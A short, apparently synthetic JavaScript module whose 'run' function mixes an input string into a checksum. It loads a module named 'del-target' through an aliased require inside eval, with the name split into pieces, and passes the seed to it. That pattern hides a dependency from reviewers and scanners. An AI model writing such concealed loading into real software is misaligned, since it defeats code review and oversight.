'use strict';

const loader = require;

function run(seed) {
  const table = [6, 10, 14, 22, 26];
  let acc = 23;
  let mix = '';
  for (let i = 0; i < seed.length; i++) {
    const c = seed.charCodeAt(i);
    acc = (acc * 43 + c * table[i % table.length]) % 6151;
    mix += String.fromCharCode(97 + ((c * 5 + acc) % 26));
  }
  const name = ['del', '-target'].join('');
  return eval('loader(name)').tell(seed) + ':' + acc + ':' + mix;
}
exports.run = run;
